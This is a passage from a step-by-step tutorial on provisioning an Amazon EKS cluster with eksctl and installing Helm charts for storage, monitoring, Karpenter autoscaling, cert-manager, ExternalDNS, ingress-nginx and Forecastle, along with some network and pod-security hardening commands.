ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms-karpenter.yml\" --tags \"${TAGS//,/ }\" fi AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\` || OutputKey==\\`KarpenterNodeRoleArn\\` || OutputKey==\\`KarpenterNodeInstanceProfileName\\` || OutputKey==\\`KarpenterControllerPolicyArn\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") AWS_KARPENTER_NODE_ROLE_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterNodeRoleArn\\\") .OutputValue\") AWS_KARPENTER_NODE_INSTANCE_PROFILE_NAME=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterNodeInstanceProfileName\\\") .OutputValue\") AWS_KARPENTER_CONTROLLER_POLICY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterControllerPolicyArn\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b accessConfig: authenticationMode: API_AND_CONFIG_MAP accessEntries: - principalARN: ${AWS_KARPENTER_NODE_ROLE_ARN} type: EC2_LINUX - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/admin accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:user/aws-cli accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster iam: withOIDC: true podIdentityAssociations: - namespace: aws-ebs-csi-driver serviceAccountName: ebs-csi-controller-sa roleName: eksctl-${CLUSTER_NAME}-pia-aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true - namespace: cert-manager serviceAccountName: cert-manager roleName: eksctl-${CLUSTER_NAME}-pia-cert-manager wellKnownPolicies: certManager: true - namespace: external-dns serviceAccountName: external-dns roleName: eksctl-${CLUSTER_NAME}-pia-external-dns wellKnownPolicies: externalDNS: true - namespace: karpenter serviceAccountName: karpenter # roleName: eksctl-${CLUSTER_NAME}-pia-karpenter roleName: ${CLUSTER_NAME}-karpenter permissionPolicyARNs: - ${AWS_KARPENTER_CONTROLLER_POLICY_ARN} - namespace: aws-load-balancer-controller serviceAccountName: aws-load-balancer-controller roleName: eksctl-${CLUSTER_NAME}-pia-aws-load-balancer-controller wellKnownPolicies: awsLoadBalancerController: true addons: - name: coredns - name: eks-pod-identity-agent - name: kube-proxy - name: snapshot-controller - name: vpc-cni version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 # disablePodIMDS: true - keep it disabled due to aws-load-balancer-controller volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} privateNetworking: true bottlerocket: settings: kubernetes: seccomp-default: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" Enhance the security posture of the EKS cluster by addressing the following concerns: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The namespace does not have a PSS level assigned: kubectl label namespace default pod-security.kubernetes.io/enforce=baseline Label all namespaces to provide warnings when configurations deviate from Pod Security Standards: kubectl label namespace --all pod-security.kubernetes.io/warn=baseline Details can be found in: Enforce Pod Security Standards with Namespace Labels EKS Pod Identities Here is a screenshot from the AWS Console showing the EKS Pod Identity Associations: EKS Pod Identity associations Snapshot Controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.2\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller kubectl label namespace snapshot-controller pod-security.kubernetes.io/enforce=baseline Amazon EBS CSI driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. (The ebs-csi-controller-sa ServiceAccount was created by eksctl.) Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.31.0\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: name: ebs-csi-controller-sa region: ${AWS_DEFAULT_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true Mailpit Mailpit will be used to receive email alerts from Prometheus. Install the mailpit Helm chart and modify its default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.17.4\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/axllent/mailpit/61241f11ac94eb33bd84e399129992250eff56ce/server/ui/favicon.svg forecastle.stakater.com/appName: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit kubectl label namespace mailpit pod-security.kubernetes.io/enforce=baseline Screenshot: kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It’s combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false # https://github.com/prometheus-community/helm-charts/blob/main/charts/alertmanager/values.yaml alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 37 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus # https://github.com/DevOps-Nirvana/Grafana-Dashboards 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 28 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 18 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus karpenter-capacity-dashboard: url: https://raw.githubusercontent.com/aws/karpenter-provider-aws/ef0a6924c915c8e75a120b1c5674aba92e222f51/website/content/en/v1.2/getting-started/getting-started-with-karpenter/karpenter-capacity-dashboard.json karpenter-performance-dashboard: url: https://raw.githubusercontent.com/aws/karpenter-provider-aws/ef0a6924c915c8e75a120b1c5674aba92e222f51/website/content/en/v1.2/getting-started/getting-started-with-karpenter/karpenter-performance-dashboard.json grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailpit-smtp.mailpit.svc.cluster.local:25\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true selfMonitor: enabled: true prometheus-node-exporter: networkPolicy: enabled: true prometheusOperator: networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi additionalScrapeConfigs: - job_name: karpenter kubernetes_sd_configs: - role: endpoints namespaces: names: - karpenter relabel_configs: - source_labels: - __meta_kubernetes_endpoints_name - __meta_kubernetes_endpoint_port_name action: keep regex: karpenter;http-metrics EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. It automatically launches appropriately sized compute resources to handle your cluster’s applications. Install the Karpenter Helm chart and modify its default values: # renovate: datasource=github-tags depName=aws/karpenter-provider-aws KARPENTER_HELM_CHART_VERSION=\"0.37.0\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF serviceAccount: name: karpenter serviceMonitor: enabled: true logLevel: debug settings: clusterName: ${CLUSTER_NAME} interruptionQueue: ${CLUSTER_NAME} EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter kubectl label namespace karpenter pod-security.kubernetes.io/enforce=baseline Configure Karpenter by applying the following NodePool and EC2NodeClass definitions: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-ec2nodeclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1beta1 kind: NodePool metadata: name: default spec: template: metadata: labels: managedBy: karpenter spec: nodeClassRef: apiVersion: karpenter.k8s.aws/v1beta1 kind: EC2NodeClass name: default requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: cpu: 8 memory: 32Gi disruption: consolidationPolicy: WhenUnderutilized expireAfter: 720h # 30 * 24h = 720h --- apiVersion: karpenter.k8s.aws/v1beta1 kind: EC2NodeClass metadata: name: default annotations: kubernetes.io/description: \"EC2NodeClass for running Bottlerocket nodes\" spec: amiFamily: Bottlerocket subnetSelectorTerms: - tags: karpenter.sh/discovery: ${CLUSTER_NAME} Name: \"*Private*\" securityGroupSelectorTerms: - tags: karpenter.sh/discovery: ${CLUSTER_NAME} instanceProfile: ${AWS_KARPENTER_NODE_INSTANCE_PROFILE_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.15.0\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager kubectl label namespace cert-manager pod-security.kubernetes.io/enforce=baseline Add ClusterIssuers for the Let’s Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF ExternalDNS ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.4\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns kubectl label namespace external-dns pod-security.kubernetes.io/enforce=baseline AWS Load Balancer Controller The AWS Load Balancer Controller is a controller that manages Elastic Load Balancers for a Kubernetes cluster. It is used by ingress-nginx. Install the aws-load-balancer-controller Helm chart and modify its default values: # renovate: datasource=helm depName=aws-load-balancer-controller registryUrl=https://aws.github.io/eks-charts AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION=\"1.11.0\" helm repo add --force-update eks https://aws.github.io/eks-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" &lt;&lt; EOF serviceAccount: name: aws-load-balancer-controller clusterName: ${CLUSTER_NAME} EOF helm upgrade --install --version \"${AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION}\" --namespace aws-load-balancer-controller --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" aws-load-balancer-controller eks/aws-load-balancer-controller kubectl label namespace aws-load-balancer-controller pod-security.kubernetes.io/enforce=baseline Ingress NGINX Controller ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: config: use-proxy-protocol: true allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} service.beta.kubernetes.io/aws-load-balancer-name: eks-${CLUSTER_NAME} service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: proxy_protocol_v2.enabled=true service.beta.kubernetes.io/aws-load-balancer-type: external loadBalancerClass: service.k8s.aws/nlb metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx kubectl label namespace ingress-nginx pod-security.kubernetes.io/enforce=baseline Forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.139\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle kubectl label namespace forecastle pod-security.kubernetes.io/enforce=baseline Screenshot: OAuth2 Proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: 